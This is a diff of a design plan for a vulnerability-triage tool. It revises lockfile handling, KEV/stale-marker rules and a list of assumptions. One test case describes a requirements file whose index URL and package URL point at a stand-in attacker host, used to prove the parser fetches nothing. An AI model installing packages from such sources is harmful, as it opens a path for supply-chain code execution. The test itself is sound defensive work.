@@ -69,7 +69,7 @@ Entries and their handling:
 | `--index-url`, `--extra-index-url`, `-i`, `--find-links` | Warning "index option ignored"; no request to that URL. |
 | A version string that does not parse under the ecosystem's rules | "version unknown", warning. |
 
-ASSUMPTION: (A7) lockfile entries without a version get the E10 "version unknown" treatment, including its effect on `scanned, incomplete` (Spec note 2). ASSUMPTION: (A8) the `uv.lock` and `package-lock.json` handling in the table. ASSUMPTION: (A9) the `requirements.txt` handling for `-c`, `-e`, VCS and URL requirements and index options.
+Lockfile entries without a version get the "version unknown" treatment, including its effect on `scanned, incomplete` (spec E10 and Asset scan status). ASSUMPTION: (A8) the `uv.lock` and `package-lock.json` handling in the table. ASSUMPTION: (A9) the `requirements.txt` handling for `-c`, `-e`, VCS and URL requirements and index options.
 
 Limit: nothing named in a requirements file is ever fetched. Enforced in the parser: it is a pure function from file text to entries and warnings, with no network client; `-r` includes are resolved by the repository reader, inside the repository only, after path normalisation (no `..` escape, no URL). Refused case (Stage 4 test): a file with `--index-url https://attacker.example/simple` and `pkg @ https://attacker.example/pkg.whl` produces two warnings and zero outbound requests (the test's network stub fails on any call).
 
@@ -123,11 +123,11 @@ Enum values (stored and sent on the wire exactly as written here, ASSUMPTION: (A
 | Tier | `P1`, `P2`, `P3`, `P4` |
 | Criticality | `low`, `medium`, `high`, `critical` |
 
-KEV value derivation: no CVE → `KEV: n/a (no CVE)`; Signal.kev_listed true → `KEV: listed`; false → `KEV: not listed`. ASSUMPTION: (A14) a CVE never checked because KEV has never been fetched (I15) shows `KEV: not listed` with the stale marker until the first successful fetch (Spec note 1). EPSS shows the score, or `n/a` when epss_score is null.
+KEV value derivation: no CVE → `KEV: n/a (no CVE)`; Signal.kev_listed true → `KEV: listed`; false → `KEV: not listed`; null because no KEV fetch has succeeded yet (I15) → `KEV: not listed` with the stale marker, until the first successful fetch (spec US-4). EPSS shows the score, or `n/a` when epss_score is null.
 
 "Stale", defined once per use (E3, I2):
 - Feed marker on signals: `Signal.kev_stale` / `Signal.epss_stale` is true when the latest refresh of that feed failed and the value shown is the last-known one, or there is none (I15). Cleared by the next successful fetch of that feed. Not a finding status.
-- Stale mark on kept findings: `Finding.stale` (with `stale_since`) is true when the asset's latest scan is `scan failed` and the finding was kept from the last successful scan. Cleared by the next successful scan. Not a finding status. ASSUMPTION: (A12) set for every `scan failed` reason, not only `feed unavailable` (E3 names only OSV).
+- Stale mark on kept findings: `Finding.stale` (with `stale_since`) is true when the asset's latest scan is `scan failed` and the finding was kept from the last successful scan. Cleared by the next successful scan. Not a finding status. Set for every `scan failed` reason that keeps findings (spec Asset scan status, E3, E5).
 
 ASSUMPTION: (A15) when a newly fetched advisory's aliases join two stored vulnerabilities (E9), they are merged into one; the finding with the earlier first detection keeps its id, lifecycle and audit trail, and the other's audit entries move to it.
 
@@ -446,14 +446,11 @@ Tier A uses no Tier B or C component: it runs on SQLite with no Docker, n8n, Col
 - (A4) Scans and briefs run as background jobs in the backend with a job table and one worker.
 - (A5) Lockfiles are looked for at the repository root only.
 - (A6) One finding per package across several files; highest per-entry fixed version; `fixed` only when every entry is clear.
-- (A7) Versionless lockfile entries get the E10 "version unknown" treatment.
 - (A8) The `uv.lock` and `package-lock.json` entry handling, including lockfileVersion 1 as a parse error.
 - (A9) The `requirements.txt` handling for `-c`, `-e`, VCS and URL requirements and index options.
 - (A10) OSV's match is the candidate set; a disagreement with VulnTriage's range check keeps the finding with a warning.
 - (A11) `last_affected`-only or open-ended intervals give no fixed version.
-- (A12) The stale mark on kept findings applies to every `scan failed` reason.
 - (A13) Enum values are stored and sent on the wire exactly as the spec writes them.
-- (A14) A CVE never checked against KEV shows `KEV: not listed` with the stale marker.
 - (A15) Vulnerabilities whose aliases join are merged; the earlier finding keeps its id and lifecycle.
 - (A16) Criticality values are final as `low`, `medium`, `high`, `critical`.
 - (A17) Only criticality `critical` counts as "critical" in the tier rules.
@@ -481,6 +478,8 @@ Tier A uses no Tier B or C component: it runs on SQLite with no Docker, n8n, Col
 - (A39) Held notification jobs never fire the US-14 alert.
 - (A40) Instrumentation is a no-op without a Collector endpoint.
 - (A41) If Juice Shop has no supported lockfile, an open-source repository pinned to older versions replaces it.
+
+A7, A12 and A14 became spec rules in the second #43 spec commit and were removed; their numbers are not reused.
 
 ## Suggested additions (not in the plan unless approved)
 
